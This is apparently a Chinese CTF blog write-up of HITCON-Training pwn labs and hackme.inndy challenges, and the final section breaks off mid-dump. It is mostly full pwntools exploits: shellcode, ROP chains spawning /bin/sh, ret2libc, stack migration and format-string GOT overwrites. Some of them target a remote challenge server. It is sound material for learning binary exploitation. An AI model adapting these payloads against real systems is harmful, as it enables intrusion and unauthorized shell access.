    <content type="text"><![CDATA[lab1方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用123456key = "Do_you_know_why_my_teammate_Orange_is_so_angry???"cipher = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]flag = ""for i in range(len(cipher)): flag += chr(cipher[i]^ord(key[i]))print flag 方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：12345678910111213在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方► 0x80486e7 &lt;get_flag+332&gt; lea eax, [ebp - 0x80] 0x80486ea &lt;get_flag+335&gt; push eax 0x80486eb &lt;get_flag+336&gt; push dword ptr [ebp - 0x74] 0x80486ee &lt;get_flag+339&gt; call read@plt &lt;0x8048410&gt;再运行到0x8048712处，可以查看 ebp - 0x80的值 pwndbg&gt; x/wx ($ebp -0x80)0xffffcd08: 0x4f77e43c转成十进制，输入就能得到flagpwndbg&gt; cContinuing.1333257276 CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;[Inferior 1 (process 7593) exited normally] 方法3：同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可 lab2checksec 一波，只开了 canary 到IDA里看一波，程序逻辑很简单，就是让你输入一个shellcode然后执行它，但是这里需要注意orw_seccomp函数，里面有个prctl会限制部分syscall的调用，只能通过open ,read , write 到获得flag，不是很懂prctl的第一个参数的数值代表什么，就估且当做是第n个的代号吧,往下数到第22个 既然只能读写，那就不能用system(/bin/cat flag)去获取flag，这里我们需要自己写shellcode：123fp = open("flag",0)read(fp,buf,0x30)write(1,buf,0x30) 首先我们要查到open,read,write三个函数对应的系统调用号和参数应该调入的寄存器：linux syscall 接下来写shellcode：123456789101112131415161718192021fp = open(&quot;flag&quot;,0)push 0 0截断：这个0是必需的，这样才能截断字符串的读取push 0x67616c66 &quot;flag&quot;mov ebx,esp open的第一个参数 &quot;flag&quot;xor ecx,ecx 将ecx清0，做为open的第二个参数mov eax,0x5 open的系统调用号int 0x80 中断，进入系统调用read(fp,buf,0x30) mov ebx,eax 系统调用结束 ，将返回值存入eax，（open的返回值为fp,而fp为read的第一个参数）将ebx赋值为fp，做为read的第一个参数mov ecx,esp 将栈顶传给ecx做为read的第二个参数mov edx,0x30 read的第三个参数0x30xor eax,eax 清空eaxmov eax,0x3 read的系统调用号int 0x80 中断，进入系统调用write(1,buf,0x30)（因为write的第二个参数跟read的一样，所以这里可以不用再传一次）mov ebx,1 write的第1个参数mov edx,0x30 write的第三个参数mov eax,0x4 write的系统调用号int 0x80 中断，进入系统 调用 因为自己踩过坑，这里补充一下0截断，也就是在push “flag”之前 为什么要push 0：字符串在读取的时候总是以\x00作为结束标志，如果不先push 0，那么它会将后面的东西也当做字符串读取进来，这样会导致系统读到的文件名不是”flag”，而是”flag…..”后面还有东西，这样就会找不到flag，这里read的返回值就为-1。 这样，shellcode就写完了，exp如下 ：12345678910111213141516171819202122232425262728293031from pwn import *p = process('./orw.bin')shellcode = '''push 0push 0x67616c66mov ebx,espxor ecx,ecxmov eax,0x5int 0x80mov ebx,eaxmov ecx,espmov edx,0x30xor eax,eaxmov eax,0x3int 0x80mov ebx,1mov edx,0x30mov eax,0x4int 0x80'''print asm(shellcode)pause()p.recvuntil(":")gdb.attach(p,"b *0x08048582")pause()p.sendline(asm(shellcode))pause()p.interactive() lab3这一题很简单，第一次输入写进了bss段，第二次输入用gets函数，所以我们只需要在第一次输入的时候输入shellcode，第二次输入将返回地址覆盖成bss段的地址就行，需要注意的是,s的偏移并不是0x14，而是0x1c，如果 IDA 看不出来可以在gdb下信断点查看 exp:1234567891011from pwn import *p = process('./ret2sc')shellcode_addr = 0x0804A060shellcode = asm(shellcraft.sh())p.recvuntil(":")p.sendline(shellcode)p.recvuntil(":")payload = "A" * 0x1c + p32(0) + p32(shellcode_addr)p.sendline(payload)p.interactive() lab4两次输入，第一次输入一个地址，然后程序打印出地址的内容，这可以想到将puts_got地址输入就可以拿到puts函数的真实，先checksec一波 一道简单的ret2libc，那么接下来思路很简单，第一次输入给puts_got地址，拿到puts函数的真实地址，再得到puts函数的libc地址就可以算出偏移，之后 就可以为所欲为的得到其它函数的真实地址了；先找一下库文件： 接下来解决两个小问题：1、查找 字符串”\bin\sh”2、爆出第二次输入的偏移字符串的查找可以用pwntoolsbinsh_libc = libc.search(&#39;/bin/sh&#39;).next()偏移的获得用cyclic 参数生成一串字符之后 ，在gdb中输入得到一个地址，再用cyclic -l 地址即可得到到ret的偏移： exp:1234567891011121314151617181920212223242526272829303132# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./ret2lib')elf = ELF('./ret2lib')libc = ELF('/lib/i386-linux-gnu/libc.so.6')puts_got = elf.got['puts']print str(puts_got) #134520860pause()p.sendline(str(puts_got))p.recvuntil(": ")puts_addr = int(p.recv(10),16)print "puts_addr:" + hex(puts_addr)puts_libc = libc.symbols['puts']print "puts_libc:" + hex(puts_libc)system_libc = libc.symbols['system']print "system_libc:" + hex(system_libc)binsh_libc = libc.search('/bin/sh').next() 查找 "/bin/sh" 的地址print "binsh_libc:" + hex(binsh_libc)offset = puts_addr - puts_libc #偏移system_addr = offset + system_libcbinsh_addr = offset + binsh_libc# main = 0x804857Dret= 0xdeadbeef #返回地址随意payload = "A" * 60payload += p32(system_addr) + p32(ret) + p32(binsh_addr)# payload += p32(system_addr) + 'b' * 4 + p32(binsh_addr)# gdb.attach(p,"b *0x0804862F")# pause()p.sendline(payload)p.interactive() lab5先checksec 一波 开启了NX保护，静态链接，溢出的空间也够构造rop链，一看就是return to syscall，但是没有发现system函数，也没有”/bin/sh”，这就需要我们自己写execve(“/bin/sh”)了我的思路是这样：将”/bin/sh”构造在bss段作为execve的参数，然后进入系统调用execve；那么我们先要找到一个可以写到内存的gadget：0x0807b301 : mov dword ptr [eax], edx ; ret,bss段的写入就跟之前的没什么两样，找到gadget：1230x080bae06 : pop eax ; ret0x0806e82a : pop edx ; ret0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret 这里还需要找到 int 0x80 : int 0x80```系统中断调用123456789101112131415161718192021222324252627282930313233343536这里还需要查一下sys_execve函数的系统调用号和参数对应的寄存器：![image.png](https://upload-images.jianshu.io/upload_images/12343640-872bc99fa961056a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)接下来就开始构造rop了：exp:```python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./simplerop&apos;)elf = ELF(&apos;./simplerop&apos;)bss = 0x080EAF80binsh = &quot;/bin/sh\x00&quot;mov_ineax = 0x0807b301# mov_eax_ecx = 0x080a7a6apop_edx_ecx_ebx = 0x0806e850pop_eax = 0x080bae06pop_ebx = 0x080481c9pop_edx = 0x0806e82aint0x80 = 0x080493e1payload = &quot;A&quot; * 32 #将&quot;/bin/sh\x00&quot;分两次写入bss段payload += p32(pop_eax) + p32(bss)payload += p32(pop_edx) + binsh[0:4]payload += p32(mov_ineax)payload += p32(pop_eax) + p32(bss + 4)payload += p32(pop_edx) + binsh[4:8]payload += p32(mov_ineax)#构造 execve(&quot;/bin/sh\x00&quot;)函数并调用 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss)payload += p32(pop_eax) + p32(0x0b)#中断 ，进入系统调用 payload += p32(int0x80)p.sendline(payload)p.interactive() lab6从IDA我们可以看到，main函数只能调一次，那么就用不了ret2libc了，接下来算出溢出的空间只有20个字节（这里96是被我改过的，原题大小是0x40) checksec： 溢出的空间是不够用来构造rop链的，那么就要用到栈迁移了，思路是：先利用溢出执行一次read函数，把我们接下来要执行的rop链写到bss段去，利用leave将ebp跳转到bss段上去，让程序 当成栈去执行，从而达到栈迁移的目的找到对应的gadget就可以开始写exp了exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./migration')elf = ELF('./migration')# libc = ELF('/lib/i386-linux-gnu/libc.so.6')libc = elf.libcsystem_libc = libc.symbols['system']print "system_libc :" + hex(system_libc)puts_plt = elf.plt['puts']print "puts_plt :" + hex(puts_plt)puts_got = elf.got['puts']print "puts_got :" + hex(puts_got)puts_libc = libc.symbols['puts']print "puts_libc :" + hex(puts_libc)read_plt = elf.plt['read']print "read_plt :" + hex(read_plt)binsh = libc.search("/bin/sh").next()print "binsh :" + hex(binsh)leave_ret = 0x08048418buf1 = elf.bss() + 0x500buf2 = elf.bss() + 0x400# pop_ebp = 0x0804856bpop_ebx = 0x0804836d#调用 read 函数往 buf1 写入"/bin/sh"（不明白的一点，为什么第一个参数是0,第一个参数不该是指向"/bin/sh"的一个指针吗？）#read的第一个参数为0指的是标准输入流也就是键盘，在脚本里面的键盘就是payload,也就是下一个senndline(payload)就是读入的内容 payload = "A" * 40payload += p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(0x100)p.recvuntil(" :\n")# gdb.attach(p)pause()p.send(payload)# pause()#打印出puts的真实地址 ，然后继续调用 read 函数payload = p32(buf2) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)p.send(payload)# pause()#接收打印的puts真实地址 puts_addr = u32(p.recv(4))print "puts_addr :" + hex(puts_addr)#算偏移offset = puts_addr - puts_libcsystem_addr = offset + system_libcbinsh_addr = offset + binshpayload = p32(0) + p32(system_addr) + "bbbb" + p32(binsh_addr)p.send(payload)p.interactive()# 0xf7df9ca0 这里盗来23R3F师傅的一张图来理解栈迁移的过程 lab7先checksec一波，canary开了，不能愉快地栈溢出了 这道题的意思很清楚，password是一个随机数，只要在第二次输入的时候相等那就可以cat 到 flag ，那么我们需要在第二次输入之前就知道password的值，这里我自然而然地想到了用gdb下断查看 password 的值，这种做法虽然在本地可以但是一但远程了就没鸟用；这就用到了格式化字符串首先，我们要泄漏出password的值 ，要先得到格式化字符串的地址在哪，输入一串东西&quot;“AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p........ %p泄漏出了printf栈里面的东西，找到AAAA的位置，在第十个，也就是说，格式化字符串的栈的第十个位置，接下来我们就可以构造 [地址] + %10$s将password 泄漏出来，然后接下来就简单了。exp:12345678910111213141516171819202122#-*- coding:utf-8 -*-from pwn import *p = process('./crack')#输入"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...."可以爆出格化字符串的偏移为10password = 0x804A048# print p32(password)# pause()payload = p32(password) + "#" + "%10$s" + "#" #输入两个#用作标记p.recvuntil("What your name ? ")p.send(payload)p.recvuntil("#") #当接收到第一个#时开始返回password的内容了，接收r = p.recvuntil("#") #接收到 # 结束# print rprint len(r)pause()print u32(r[:4]) #因为第二个#会被接收，所以要去掉a = u32(r[:4])# print str(a)# pause()p.recvuntil("Your password :")p.send(str(a))p.interactive() lab8拿到题目，先checksec一波 开了canary，跟栈溢出没关系了，放到IDA里很明显可以看到我们只需要修改magic的值为218或者0xFACEB00C就行了，再看这一句printf(&amp;buf);很明显是格式化字符串了。先测试格式化字符串的位置： 偏移为7，接下来修改magic为2181234567891011121314#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')#改小magic = 0x0804A038payload = ""payload += p32(magic) + "%0214c" + "%7$n" #218-4 = 214，前面有个地址4位，所以只需再填214个字符payload2 = fmtstr_payload(7,&#123;magic:218&#125;)p.sendline(payload)p.recv()p.interactive() 修改magic为0xFACEB00C12345678910111213141516171819202122232425262728#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')magic = 0x0804A038padding1 = 0x10c-16 #因为0c-16&lt;0所以要在前面加一位(这个加了一位1),这样才能将0c读进去padding2 = 0x1b0 - 0x10cpadding3 = 0x1ce - 0x1b0padding4 = 0x1fa - 0x1ceprint padding1print padding2print padding3print padding4pause()payload = ""payload += p32(magic) + p32(magic+1) + p32(magic+2) + p32(magic+3)# payload += padding1*'a' + "%7$n" + padding2*'b' + "%8$n" + padding3*'c' + "%9$n" + padding4*'d' + "%10$n"payload += "%252c%7$hhn" #padding1 252+16 = 10c(以下同理)payload += "%164c%8$hhn" #padding2payload += "%30c%9$hhn" #padding3payload += "%44c%10$hhn" #padding4# payload2 = fmtstr_payload(7,&#123;magic:0xFACEB00C&#125;) #也可以直接调用fmtstr_payload这个函数p.sendline(payload2)# p.sendline(payload)p.recv()p.interactive() 搜索大佬的博客发现还有另外 两种做法：1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址，这样到执行puts(&quot;You need be a phd&quot;);时就会直接执行system(&quot;cat /home/craxme/flag&quot;);2、修改puts的got表为read(0, &amp;buf, 0x100u);把printf 的got表改为system的plt表地址，这样就能拿到shell了（我只能说骚啊）1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址 12345678910111213#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']system_catflag = 0x80485F3#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:system_catflag&#125;)p.sendline(payload)p.interactive() 2、get shell123456789101112131415#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']printf_got = elf.got['printf']system_plt = elf.plt['system']#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:read,printf_got:system_plt&#125;)p.sendline(payload)p.sendline('/bin/sh\x00') #这一句可加可不加我也不清楚 为什么 p.interactive() lab9格式化字符串漏洞，不过是有点蛇皮的格式化字符串，学到了不少新姿势 很明显的格式化字符串，但同时也可以发现，我们的输入是写到bss段去的，那就有一个问题了，我们要怎么利用格式化字符串修改got表为system函数的地址，因为这里我们要解决怎么把某个函数的got值放到栈里面去先看一下栈中的情况 可以发现输入放在bss段且固定在esp，但是也发现了几个有用的地址ebp1,fmt7,ebp2,fmt11，他们的格式化字符的偏移分别为6，7，10，11，我们还发现了libc_start_main+247这个真实地址，先泄漏出这个真实地址就可以得到偏移，进而算出其它函数的地址1234506:0018│ ebp 0xffffcd48 —▸ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x007:001c│ 0xffffcd4c —▸ 0x8048584 (play+59) ◂— nop 、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、0a:0028│ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x00b:002c│ 0xffffcd5c —▸ 0x80485b1 (main+42) ◂— nop 我们可以看到ebp1是指向ebp2的指针，ebp2指向一个不知名的地址，这样我们就可以得到栈的地址，因此，如果我们使用%n对ebp1进行操作，那么实际上会修改ebp2的内容，所以，如果我们将ebp2修改为指向fmt7，那么就可以对ebp2进行%n操作来修改fmt7的内容，试想，把fmt7的内容修改为printf_got，这样就实现了把got值放到栈里面去了，接下来就可能通过偏移来进行修改，但是又有另一个问题，一次只能修改2个字节，而需要修改的有4 个字节，又因为我们本来就是利用 printf 函数实现修改的，所以只能一次性修改4个字节（如果修改的不是printf函数，因为有个while循环，可以回到再利用printf函数进行第二次修改）。所以我们可以把要修改的高2 个字节放到fmt11去，同时修改两个位置，这样就可以了，那么思路就出来了。1234561、先泄漏出libc_start_main的地址，算出偏移2、利用偏移得到system等函数的地址3、泄漏出栈地址4、利用ebp1指向ebp2的关系修改ebp2指向fmt7，进而修改fmt7为printf_got，修改ebp2指向fmt11，进而修改fmt11为printf_got+25、修改fmt7和fmt11内容为system的地址6、发送&apos;/bin/sh&apos;做为system 的参数执行那可 exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#-*-coding:utf-8-*-#libc_start_main+247在偏移15处from pwn import *context.log_level = 'debug'p = process('./playfmt')# /lib/i386-linux-gnu/libc-2.23.soelf = ELF('./playfmt')libc = elf.libc p.recv()#泄漏 libc_start_main 的地址 p.sendline('%15$p')libc_start_main = int(p.recv(),16)-247print 'libc_start_main--&gt;' + hex(libc_start_main)# libc_start_main 的libc地址 libc_start_main_libc = libc.symbols['__libc_start_main']print 'libc_start_main_libc--&gt;' + hex(libc_start_main_libc)offset = libc_start_main - libc_start_main_libcprint 'offset--&gt;' + hex(offset)system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)printf_addr = offset + libc.symbols['printf']print 'printf_addr--&gt;' + hex(printf_addr) printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)# one_gadget = 0x3ac5c + offset# print 'one_gadget--&gt;' + hex(one_gadget)# 修改 printf_got 为 system_addr# 泄漏 ebp p.sendline('%6$p')ebp2 = int(p.recv(),16) #10ebp1 = ebp2-0x10 #6fmt7 = ebp1+0x4fmt11 = ebp2+0x4print 'ebp1--&gt;' + hex(ebp1)print 'ebp2--&gt;' + hex(ebp2)print 'fmt7--&gt;' + hex(fmt7)print 'fmt11--&gt;' + hex(fmt11)pause()# 先将 ebp2 指向fmt7# gdb.attach(p,"b *0x0804853B")p.sendline('%'+str(fmt7&amp;0xffff)+'c%6$hn')p.recv()# 再将 fmt7 修改为print_gotp.sendline('%'+str(printf_got&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break# 现在要将 fmt11 修改为print_got+2# 先将 ebp2 指向fmt11p.sendline('%'+str(fmt11&amp;0xffff)+'c%6$hn')p.recv()#再将 fmt11 修改为printf_got+2(即printf_got的高4位现在在printf_got+2的低4位的位置)p.sendline('%'+str((printf_got+2)&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break'''这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作需要注意的是，要构造一个字符串“n0va”来作标志，返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成'''# --------到这里fmt7放着printf_got(即printf_addr),fmt11放着printf_got+2(即printf_addr的高4位移到了低4位的位置)# 修改printf_got 为sytem_addr (要同时修改fmt7为print_addr的低4位，fmt11为printf_addr的高4位)# 修改printf_got 的低4位payload = '%'+str((system_addr&amp;0xffff)-12)+'c%7$hn' #在调试时发现，在'%...c'之前有3个'n0va'所以要-12才能保证正确定入# 修改printf_got 的高4位payload += '%'+str((system_addr&gt;&gt;16)-(system_addr&amp;0xffff))+'c%11$hn'gdb.attach(p,"b *0x0804853B")p.sendline(payload)p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: breakp.sendline('/bin/sh')p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[hackme.inndy之pwn]]></title>
    <url>%2F2019%2F03%2F28%2Fhackme.inndy%E4%B9%8Bpwn%2F</url>
    <content type="text"><![CDATA[catflagnc 连接直接get shell homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe 这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process('./homework')p = remote('hackme.inndy.tw',7701)call_me = 0x80485FBprint str(call_me)pause()p.recvuntil('What\'s your name? ')p.sendline('n0va')p.recvuntil('4 &gt; dump all numbers\n')p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Index to edit: ')p.sendline('14')p.recvuntil('How many? ')p.sendline(str(call_me))p.sendline('0')p.interactive() ROP栈溢出，而且是gets的栈溢出，溢出空间无限，可以随便写，这道题有很多种写法，这里选择system call execve的系统调用号为0xb,eax,放着系统调用号，ebx,ecx,edx分别放着execve的三个参数，先找一波gadget 123450x0806c943 : int 0x800x080b8016 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080de769 : pop ecx ; ret0x0806ecda : pop edx ; ret 于是就可以构造ROP链进入系统 调用了 exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *p = process('./rop')p = remote("hackme.inndy.tw","7704")elf = ELF('./rop')bss_addr = elf.bss()pop_in_ecx = 0x0804b5bapop_eax = 0x080b8016pop_ebx = 0x080481c9pop_ecx = 0x080de769pop_edx = 0x0806ecdaint_0x80 = 0x0806c943payload = 16*'a'payload += p32(pop_ecx) + p32(bss_addr)#分两次将'/bin/sh'写入bss段payload += p32(pop_in_ecx) + '/bin'payload += p32(pop_ecx) + p32(bss_addr+4)payload += p32(pop_in_ecx) + '/sh\x00'payload += p32(pop_eax) + p32(0xb)#bss_addr放着'/bin/sh'做为execve的第一个参数payload += p32(pop_ebx) + p32(bss_addr)payload += p32(pop_ecx) + p32(0)payload += p32(pop_edx) + p32(0)payload += p32(int_0x80)p.sendline(payload)p.interactive() ROP2syscall()是系统调用函数，第一个参数是系统调用号，后面的函数分别为调用函数的参数，查表可知4为write函数的系统调用号，3为read函数的系统调用号，所以 123syscall(4, 1, v4, 42); == write(1,v4,42)syscall(3, 0, &amp;v1, 1024); == read(0,&amp;v1,1024)return syscall(4, 1, &amp;v1, 1024); == return write(1,&amp;v1,1024) read 这里就存在一个很明显的栈溢出了，我们可以控制程序回到syscall的位置，只要将他的4个参数分别设为(b,&#39;/bin/sh&#39;,0,0)就行了 exp: 1234567891011121314151617181920#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./rop2')p = remote("hackme.inndy.tw","7703")elf = ELF('./rop2')bss_addr = elf.bss()syscall = 0x8048320overflow = 0x8048454#先调用read往bss段写入'/bin/sh'payload = 16*'a'payload += p32(syscall) + p32(overflow)payload += p32(3) + p32(0) + p32(bss_addr) + p32(8)p.sendline(payload)p.send('/bin/sh\x00')#调用execve函数get shellpayload = 16*'a'payload += p32(syscall) + p32(0) + p32(0xb) + p32(bss_addr) + p32(0) + p32(0)p.sendline(payload)p.interactive() toooomuch可以看到有一个gets，而且还有一个print_flag函数直接打印flag，溢出跳转就完事了 exp: 123456789from pwn import *# context.log_level = 'debug'# p = process('./toooomuch')p = remote("hackme.inndy.tw","7702")print_flag = 0x804863Bpayload = 28*'a'payload += p32(print_flag)p.sendline(payload)p.interactive() toooomuch-2程序 跟toooomuch一模一样，但是这次要求get shell ，那就不能直接跳到print_flag函数上去了 因为什么保护都没开，所以可以直接ret2shellcode，思路是这样的，先跳到gets函数往bss段写入shellcode，再跳到bss执行shellcode exp: 123456789101112131415from pwn import *context.log_level = 'debug'# p = process('./toooomuch-2')p = remote("hackme.inndy.tw","7702")elf = ELF('./toooomuch-2')bss_addr = elf.bss()gets_addr = elf.plt['gets']shellcode = asm(shellcraft.sh())payload = 28*'a'#----------(覆盖返回地址) ---（gets的返回地址）--（gets的参数）payload += p32(gets_addr) + p32(bss_addr) + p32(bss_addr)p.recvuntil('Give me your passcode: ')p.sendline(payload)p.sendline(shellcode)p.interactive() echo这是一道格式化字符串，直接修改printf_got为system_plt的值就行了，都是已知值，手动修改（当然也可以用工具 : fmtstr_payload(7,{printf_got:system_plt})） exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-# 偏移为7from pwn import *# p = process('./echo')p = remote("hackme.inndy.tw","7711")elf = ELF('./echo')printf_got = elf.got['printf']system_plt = elf.plt['system']print "printf_got--&gt;" + hex(printf_got)print "system_plt--&gt;" + hex(system_plt) #0x8048400pause()payload = p32(printf_got) + p32(printf_got+1) + p32(printf_got+2) + p32(printf_got+3)'''\x00\x84\x04\x08'''payload += '%240c' + '%7$hhn' #0x100-16payload += '%132c' + '%8$hhn' #0x184-0x100payload += '%128c' + '%9$hhn' #0x204-0x184payload += '%4c' + '%10$hhn' #0x208-0x204print payloadpause()p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() echo264位的格式化字符串漏洞，漏点跟echo一样，不过有一些坑需要注意一下 首先是保护开启了PIE，位置无关的可执行程序，即可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可以运行进程。但是低两位字节是固定的，所以可以通过这个泄露出程序的基地址。 64位程序函数地址存在&#39;\x00&#39;截断，所以要将函数地址放在最后（不能用fmtstr_payload这个工具，它只适用于32位） printf处下断查看栈可以看到main+74和libc_start_main+340这两个可以泄漏的地址，偏移分别为41和43，因为开启了PIE，而且后三位不变，所以可以泄漏出程序基地址就是0x555555554a03-0xa03，之后对一切地址的操作都加上这个基地址就是正确的地址了，以及libc_start_main的真实地址0x7ffff7a2d830-240就可以算出偏移，从而得到其它函数的真空地址，比如system，不过这道题我用的是one_gadget一把梭 得到了真实地址和偏移就可以进行写入操作了，修改exit_got表为one_gadget_addr exp: 1234567891011121314151617181920212223242526272829303132333435363738#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p = remote("hackme.inndy.tw","7712")# p = process('./echo2')elf = ELF('./echo2')libc = ELF("./libc-2.23.so.x86_64") #hackme网站下载# libc = elf.libc #本地libc#泄漏 main 地址 p.sendline('%41$p')elf_base = int(p.recv(),16)-0xa03print "elf_base--&gt;" + hex(elf_base)#泄漏 libc_start_main 地址 p.sendline('%43$p')libc_start_main = int(p.recv(),16)-240libc_base = libc_start_main - libc.symbols['__libc_start_main']print "libc_start_main--&gt;" + hex(libc_start_main)# one_gadget = 0xf02a4 + libc_base #本地one_gadgetone_gadget = 0xf0897+libc_base #远程one_gadgetprint "one_gadget--&gt;" + hex(one_gadget)exit_got = elf.got['exit'] + elf_baseprint "exit_got--&gt;" + hex(exit_got)hex_one_gadget = hex(one_gadget)payload1 = 4*'a'+'%'+str(int(hex_one_gadget[-4:],16)-4)+'c%8$hn'+p64(exit_got)# payload1 = '%'+str(int(hex_one_gadget[-4:],16))+'c%10$hn'+p64(exit_got)payload2 = 4*'a'+'%'+str(int(hex_one_gadget[-8:-4],16)-4)+'c%8$hn'+p64(exit_got+2)payload3 = 4*'a'+'%'+str(int(hex_one_gadget[-12:-8],16)-4)+'c%8$hn'+p64(exit_got+4)#下断# point = 0x984+elf_base# point = str(hex(point))# gdb.attach(p,"b *"+point)p.sendline(payload1)sleep(1)p.sendline(payload2)sleep(1)p.sendline(payload3)sleep(1)p.interactive() 这里解释一下4*’a&#39;：是为了最后的p64(exit_got)对齐，gdb下断看一个栈的分布就清楚了 ehco3还是格式化字符串，不过我们的输入不再是在栈中了，是保存在bss段，这就不好操作了，我们需要在栈中找到指向栈的指针来进行操作向栈写入内容（建议先做一下jarvis OJ的lab 9然后再回头来看这题，因为题型差不多，但是lab 9没有下面的蛇皮操作） 不过这题最坑的还是在hardfmt函数前的这个玩意v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));看了大佬的 writeup 这是一个抬栈操作，我们回到汇编去可以看到，在最后esp会减去eax使得整个栈帧往栈顶移了eax，而且eax是个随机数，好在还是有范围的。 测试一下我们可以发现大概的范围： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import randomfor x in xrange(1,50): buf= random.randint(0,0xffffffff) a=16 * (((buf &amp; 0x3039) + 30) / 0x10) print hex(a)----------------------------------------------------------------------------------------------0x400x100x10300x200x30200x300x30300x30100x30200x10100x10100x20200x20200x200x30200x300x300x20400x30500x30500x20300x400x30300x30300x400x20200x30400x10300x30500x10400x400x30300x20300x200x30200x10400x30100x30300x400x20500x500x10200x30200x30300x400x30200x30400x30400x3020 可能的数值有0x10,0x20,0x30,0x40,0x1030,........等等等等，也就是说一个值对应一个栈帧，所以我们只需要确定eax的值就可以确定栈的分布了，在.text:08048774 sub esp, eax下断gdb调试一下： 这一次eax 的值 为0x2050,我把它设为0x20，进去，在printf 下个断点，c一下，就可以看到正确的栈帧了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Breakpoint *0x08048646pwndbg&gt; stack 5000:0000│ esp 0xffffcd00 —▸ 0x804a080 (buff) ◂— &apos;AAAAAAAA\n&apos;... ↓02:0008│ 0xffffcd08 ◂— 0x100003:000c│ 0xffffcd0c ◂— 0x104:0010│ 0xffffcd10 ◂— 0xbd5d204605:0014│ 0xffffcd14 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch06:0018│ 0xffffcd18 —▸ 0xf7ffd918 ◂— 0x007:001c│ 0xffffcd1c ◂— 0x008:0020│ 0xffffcd20 —▸ 0xffffcd5e ◂— 0x3080409:0024│ 0xffffcd24 —▸ 0xf7e0b018 ◂— stosd dword ptr es:[edi], eax0a:0028│ 0xffffcd28 —▸ 0xf7e6021b (setbuffer+11) ◂— add ebx, 0x151de50b:002c│ 0xffffcd2c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0c:0030│ 0xffffcd30 —▸ 0xf7fe77eb (_dl_fixup+11) ◂— add esi, 0x158150d:0034│ 0xffffcd34 ◂— 0x00e:0038│ 0xffffcd38 —▸ 0xffffcd10 ◂— 0xbd5d20460f:003c│ 0xffffcd3c ◂— 0xc7e69f0010:0040│ 0xffffcd40 —▸ 0xffffcda8 ◂— 0x011:0044│ 0xffffcd44 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x112:0048│ ebp 0xffffcd48 —▸ 0xffffcda8 ◂— 0x013:004c│ 0xffffcd4c —▸ 0x804877b (main+236) ◂— mov eax, 014:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 